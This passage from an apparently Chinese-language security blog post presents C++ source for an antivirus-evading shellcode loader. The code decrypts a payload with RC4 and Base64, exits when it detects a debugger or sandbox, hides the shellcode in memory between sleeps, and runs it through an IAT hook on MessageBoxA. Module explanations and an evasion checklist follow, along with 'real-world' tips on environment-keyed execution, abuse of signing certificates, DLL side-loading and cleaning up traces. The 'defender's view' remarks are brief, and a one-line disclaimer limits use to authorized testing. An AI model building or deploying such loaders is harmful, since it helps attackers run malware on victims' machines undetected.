class="line">    PVOID shellcodeAddr = <span class="built_in">HeapAlloc</span>(hHeap, HEAP_ZERO_MEMORY, g_decryptedShellcode.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (shellcodeAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复制 Shellcode</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(shellcodeAddr, g_decryptedShellcode.<span class="built_in">data</span>(), g_decryptedShellcode.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存混淆：休眠前加密，休眠后解密（对抗内存扫描）</span></span><br><span class="line">    <span class="built_in">SleepObfuscation</span>(shellcodeAddr, g_decryptedShellcode.<span class="built_in">size</span>(), <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建线程执行 Shellcode</span></span><br><span class="line">    DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcodeAddr,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;dwThreadId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    <span class="built_in">HeapFree</span>(hHeap, <span class="number">0</span>, shellcodeAddr);</span><br><span class="line">    <span class="built_in">HeapDestroy</span>(hHeap);</span><br><span class="line"></span><br><span class="line">    g_shellcodeExecuted = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Hook 函数：劫持 MessageBoxA</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">using</span> PrototypeMessageBox = <span class="built_in">int</span>(WINAPI*)(HWND, LPCSTR, LPCSTR, UINT);</span><br><span class="line">PrototypeMessageBox originalMsgBox = MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hookedMessageBox</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发 Shellcode 执行</span></span><br><span class="line">    <span class="built_in">ExecuteShellcode</span>();</span><br><span class="line">    <span class="comment">// 调用原始函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">originalMsgBox</span>(hWnd, lpText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief IAT Hook 实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IATHookMessageBox</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LPVOID imageBase = <span class="built_in">GetModuleHandleA</span>(<span class="literal">NULL</span>);</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(</span><br><span class="line">        ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (DWORD_PTR)imageBase</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (importDescriptor-&gt;Name != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LPCSTR libraryName = (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)imageBase;</span><br><span class="line">        HMODULE library = <span class="built_in">LoadLibraryA</span>(libraryName);</span><br><span class="line">        <span class="keyword">if</span> (!library) &#123;</span><br><span class="line">            importDescriptor++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-&gt;OriginalFirstThunk);</span><br><span class="line">        PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (originalFirstThunk-&gt;u<span class="number">1.</span>AddressOfData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk-&gt;u<span class="number">1.</span>AddressOfData);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (std::<span class="built_in">string</span>(functionName-&gt;Name) == <span class="string">&quot;MessageBoxA&quot;</span>) &#123;</span><br><span class="line">                DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">VirtualProtect</span>(&amp;firstThunk-&gt;u<span class="number">1.F</span>unction, <span class="number">8</span>, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">                firstThunk-&gt;u<span class="number">1.F</span>unction = (DWORD_PTR)hookedMessageBox;</span><br><span class="line">                <span class="built_in">VirtualProtect</span>(&amp;firstThunk-&gt;u<span class="number">1.F</span>unction, <span class="number">8</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            originalFirstThunk++;</span><br><span class="line">            firstThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        importDescriptor++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==================== 主函数 ====================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 步骤1：反调试检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsDebuggerDetected</span>()) &#123;</span><br><span class="line">        <span class="comment">// 检测到调试器，正常退出（不执行恶意代码）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤2：反沙箱检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsSandboxDetected</span>()) &#123;</span><br><span class="line">        <span class="comment">// 检测到沙箱，正常退出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤3：延迟执行（对抗动态分析的时间限制）</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);  <span class="comment">// 休眠5秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤4：解密 Shellcode（RC4 + Base64）</span></span><br><span class="line">    std::string encodedShellcode = &#123;</span><br><span class="line">        <span class="comment">// 这里粘贴加密脚本生成的 C 数组内容</span></span><br><span class="line">        <span class="comment">// 示例：0x4D, 0x5A, 0x90, ...</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Base64 解码</span></span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; decodedShellcode = <span class="built_in">base64Decode</span>(encodedShellcode);</span><br><span class="line">    <span class="keyword">if</span> (decodedShellcode.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// RC4 解密</span></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;kenny&quot;</span>;  <span class="comment">// 密钥（实战中可动态生成）</span></span><br><span class="line">    <span class="type">uint8_t</span> S[N];</span><br><span class="line">    <span class="built_in">memset</span>(S, <span class="number">0</span>, <span class="built_in">sizeof</span>(S));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">KSA</span>(key, S) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">PRGA</span>(S, decodedShellcode.<span class="built_in">data</span>(), decodedShellcode.<span class="built_in">size</span>()) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存解密后的 Shellcode 到全局变量</span></span><br><span class="line">    g_decryptedShellcode = decodedShellcode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤5：执行 IAT Hook</span></span><br><span class="line">    <span class="built_in">IATHookMessageBox</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 步骤6：触发 Hook（调用 MessageBoxA）</span></span><br><span class="line">    <span class="comment">// 实战中可以是任何合法的程序逻辑，这里用弹窗演示</span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;程序正常运行&quot;</span>, <span class="string">&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="代码详细解释"><a href="#代码详细解释" class="headerlink" title="代码详细解释"></a>代码详细解释</h2><h3 id="1-反调试检测模块"><a href="#1-反调试检测模块" class="headerlink" title="1. 反调试检测模块"></a>1. 反调试检测模块</h3><p><strong>目的</strong>：检测程序是否在调试器中运行，如果检测到则正常退出，避免被逆向分析。</p>
<p><strong>实现方法</strong>：</p>
<ul>
<li><strong>IsDebuggerPresent()</strong>：Windows API，检测调试器最简单的方法</li>
<li><strong>CheckRemoteDebuggerPresent()</strong>：检测远程调试器</li>
<li><strong>PEB.BeingDebugged</strong>：直接读取进程环境块（PEB）的调试标志</li>
<li><strong>NtGlobalFlag</strong>：调试器会设置特殊的堆标志（0x70），通过检测这些标志判断</li>
</ul>
<p><strong>对抗效果</strong>：</p>
<ul>
<li>对抗 OllyDbg、x64dbg、WinDbg 等常见调试器</li>
<li>绕过简单的动态分析</li>
</ul>
<p><strong>绕过方法</strong>（防御者视角）：</p>
<ul>
<li>使用反反调试插件（如 ScyllaHide）</li>
<li>手动修改 PEB 标志</li>
<li>使用内核级调试器</li>
</ul>
<hr>
<h3 id="2-反沙箱检测模块"><a href="#2-反沙箱检测模块" class="headerlink" title="2. 反沙箱检测模块"></a>2. 反沙箱检测模块</h3><p><strong>目的</strong>：检测程序是否在沙箱环境中运行，避免被自动化分析系统捕获。</p>
<p><strong>实现方法</strong>：</p>
<ul>
<li><strong>系统运行时间</strong>：沙箱通常刚启动，运行时间短（&lt;10分钟）</li>
<li><strong>CPU 核心数</strong>：沙箱为节省资源，通常只分配 1-2 个核心</li>
<li><strong>内存大小</strong>：沙箱内存通常较小（&lt;2GB）</li>
<li><strong>磁盘大小</strong>：沙箱磁盘通常较小（&lt;60GB）</li>
<li><strong>用户交互痕迹</strong>：检查最近文件列表，沙箱中通常没有用户活动痕迹</li>
<li><strong>虚拟机进程</strong>：检测 VMware、VirtualBox、QEMU 等虚拟机的特征进程</li>
</ul>
<p><strong>对抗效果</strong>：</p>
<ul>
<li>对抗 Cuckoo Sandbox、Any.Run、Joe Sandbox 等自动化分析平台</li>
<li>对抗虚拟机环境</li>
</ul>
<p><strong>绕过方法</strong>（防御者视角）：</p>
<ul>
<li>配置沙箱模拟真实环境（增加内存、磁盘、CPU）</li>
<li>预先运行一段时间，增加系统运行时间</li>
<li>添加用户活动痕迹（最近文件、浏览器历史等）</li>
</ul>
<hr>
<h3 id="3-内存混淆模块（Sleep-Obfuscation）"><a href="#3-内存混淆模块（Sleep-Obfuscation）" class="headerlink" title="3. 内存混淆模块（Sleep Obfuscation）"></a>3. 内存混淆模块（Sleep Obfuscation）</h3><p><strong>目的</strong>：在程序休眠期间对 Shellcode 进行加密，对抗内存扫描。</p>
<p><strong>实现原理</strong>：</p>
<ol>
<li>生成随机 XOR 密钥</li>
<li>将内存保护改为可读写（PAGE_READWRITE）</li>
<li>对 Shellcode 进行 XOR 加密</li>
<li>休眠指定时间（此时内存中是加密的 Shellcode）</li>
<li>休眠结束后，用相同密钥解密 Shellcode</li>
<li>恢复内存保护为可执行（PAGE_EXECUTE_READ）</li>
</ol>
<p><strong>对抗效果</strong>：</p>
<ul>
<li>对抗内存扫描（如 YARA 规则扫描）</li>
<li>对抗进程内存 Dump 分析</li>
<li>缩短 Shellcode 明文在内存中的存在时间</li>
</ul>
<p><strong>进阶优化</strong>：</p>
<ul>
<li>使用更复杂的加密算法（如 AES）</li>
<li>动态生成密钥（基于时间戳、环境变量等）</li>
<li>分段加密（只加密关键部分）</li>
</ul>
<hr>
<h3 id="4-IAT-Hook-模块"><a href="#4-IAT-Hook-模块" class="headerlink" title="4. IAT Hook 模块"></a>4. IAT Hook 模块</h3><p><strong>目的</strong>：劫持合法函数调用，将 Shellcode 执行伪装成正常程序行为。</p>
<p><strong>实现原理</strong>：</p>
<ol>
<li>获取当前进程的基址</li>
<li>解析 PE 文件头，定位导入表（IAT）</li>
<li>遍历所有导入的 DLL 和函数</li>
<li>找到目标函数（如 MessageBoxA）</li>
<li>修改内存保护为可写</li>
<li>将函数地址替换为 Hook 函数地址</li>
<li>恢复内存保护</li>
</ol>
<p><strong>Hook 函数逻辑</strong>：</p>
<ol>
<li>执行 Shellcode</li>
<li>调用原始函数，保持程序正常运行</li>
</ol>
<p><strong>对抗效果</strong>：</p>
<ul>
<li>对抗行为分析（Shellcode 执行伪装成合法函数调用）</li>
<li>对抗静态分析（导入表中只有合法函数）</li>
<li>对抗 API 监控（监控到的是合法函数调用）</li>
</ul>
<hr>
<h3 id="5-RC4-Base64-解密模块"><a href="#5-RC4-Base64-解密模块" class="headerlink" title="5. RC4 + Base64 解密模块"></a>5. RC4 + Base64 解密模块</h3><p><strong>目的</strong>：在运行时解密 Shellcode，对抗静态特征检测。</p>
<p><strong>加密流程</strong>（Python 脚本）：</p>
<ol>
<li>读取原始 Shellcode（.bin 文件）</li>
<li>使用 RC4 算法加密</li>
<li>使用 Base64 编码</li>
<li>生成 C 数组格式</li>
</ol>
<p><strong>解密流程</strong>（C++ 加载器）：</p>
<ol>
<li>Base64 解码</li>
<li>RC4 解密</li>
<li>得到原始 Shellcode</li>
</ol>
<p><strong>对抗效果</strong>：</p>
<ul>
<li>对抗静态特征扫描（Shellcode 以加密形式存储）</li>
<li>对抗 YARA 规则匹配</li>
<li>对抗字符串提取分析</li>
</ul>
<hr>
<h3 id="6-执行流程总结"><a href="#6-执行流程总结" class="headerlink" title="6. 执行流程总结"></a>6. 执行流程总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">启动程序</span><br><span class="line">    ↓</span><br><span class="line">反调试检测 → 检测到调试器 → 正常退出</span><br><span class="line">    ↓ 未检测到</span><br><span class="line">反沙箱检测 → 检测到沙箱 → 正常退出</span><br><span class="line">    ↓ 未检测到</span><br><span class="line">延迟执行（Sleep 5秒）</span><br><span class="line">    ↓</span><br><span class="line">Base64 解码</span><br><span class="line">    ↓</span><br><span class="line">RC4 解密</span><br><span class="line">    ↓</span><br><span class="line">保存解密后的 Shellcode</span><br><span class="line">    ↓</span><br><span class="line">执行 IAT Hook（劫持 MessageBoxA）</span><br><span class="line">    ↓</span><br><span class="line">触发 Hook（调用 MessageBoxA）</span><br><span class="line">    ↓</span><br><span class="line">Hook 函数执行</span><br><span class="line">    ↓</span><br><span class="line">内存混淆（Sleep Obfuscation）</span><br><span class="line">    ↓</span><br><span class="line">创建线程执行 Shellcode</span><br><span class="line">    ↓</span><br><span class="line">清理资源</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="免杀效果分析"><a href="#免杀效果分析" class="headerlink" title="免杀效果分析"></a>免杀效果分析</h2><h3 id="对抗静态检测"><a href="#对抗静态检测" class="headerlink" title="对抗静态检测"></a>对抗静态检测</h3><ul>
<li>✅ Shellcode 加密存储（RC4 + Base64）</li>
<li>✅ 无敏感 API 直接调用（使用 IAT Hook）</li>
<li>✅ 无明显恶意字符串</li>
<li>✅ 代码混淆（反调试、反沙箱逻辑）</li>
</ul>
<h3 id="对抗动态检测"><a href="#对抗动态检测" class="headerlink" title="对抗动态检测"></a>对抗动态检测</h3><ul>
<li>✅ 反调试检测（4种方法组合）</li>
<li>✅ 反沙箱检测（6种方法组合）</li>
<li>✅ 延迟执行（对抗时间限制）</li>
<li>✅ 行为伪装（IAT Hook）</li>
</ul>
<h3 id="对抗内存扫描"><a href="#对抗内存扫描" class="headerlink" title="对抗内存扫描"></a>对抗内存扫描</h3><ul>
<li>✅ 内存混淆（Sleep Obfuscation）</li>
<li>✅ 使用堆内存（降低 VirtualAlloc 特征）</li>
<li>✅ 及时清理资源</li>
</ul>
<hr>
<h2 id="实战优化建议"><a href="#实战优化建议" class="headerlink" title="实战优化建议"></a>实战优化建议</h2><ol>
<li><p><strong>密钥动态生成</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于时间戳生成密钥</span></span><br><span class="line">SYSTEMTIME st;</span><br><span class="line"><span class="built_in">GetSystemTime</span>(&amp;st);</span><br><span class="line"><span class="type">char</span> key[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">sprintf_s</span>(key, <span class="string">&quot;key_%d%d%d&quot;</span>, st.wYear, st.wMonth, st.wDay);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>多函数 Hook</strong>：<br>同时 Hook 多个高频函数（CreateFileA、RegOpenKeyA、GetProcAddress），分散执行特征。</p>
</li>
<li><p><strong>分阶段执行</strong>：<br>将 Shellcode 分为多个阶段，每个阶段单独加密，逐步解密执行。</p>
</li>
<li><p><strong>环境指纹验证</strong>：<br>只在特定环境（如特定域名、特定用户名）下执行，避免被沙箱捕获。</p>
</li>
<li><p><strong>代码签名</strong>：<br>使用合法证书签名，提高可信度。</p>
</li>
<li><p><strong>白加黑技术</strong>：<br>结合 DLL 劫持，利用白名单程序加载恶意 DLL。</p>
</li>
</ol>
<hr>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li><strong>合法使用</strong>：本技术仅用于授权的安全测试，未经授权使用属于违法行为</li>
<li><strong>定期更新</strong>：安全产品不断更新，需要定期调整对抗技术</li>
<li><strong>测试验证</strong>：在实际使用前，务必在测试环境中验证免杀效果</li>
<li><strong>痕迹清理</strong>：执行后及时清理日志、临时文件等痕迹</li>
<li><strong>应急预案</strong>：准备好被检测后的应急处理方案</li>
</ol>
<p>通过以上多重对抗技术的组合，可以有效提升 Shellcode 加载器的免杀能力，但需要根据目标环境的具体情况灵活调整。</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Shellcode/">Shellcode</a><a class="post-meta__tags" href="/tags/RC4/">RC4</a><a class="post-meta__tags" href="/tags/Base64/">Base64</a><a class="post-meta__tags" href="/tags/%E5%8A%A0%E8%BD%BD%E5%99%A8/">加载器</a><a class="post-meta__tags" href="/tags/IAT-Hook/">IAT Hook</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2026/02/12/exchange/" title="Exchange 后渗透利用"><img class="cover" src="/img/covers/shinchan-cover-10.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Exchange 后渗透利用</div></div></div></a><a class="pagination-related  no-desc" href="/2026/02/10/sd/" title="内网隧道与代理技术"><img class="cover" src="/img/covers/shinchan-cover-08.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">内网隧道与代理技术</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>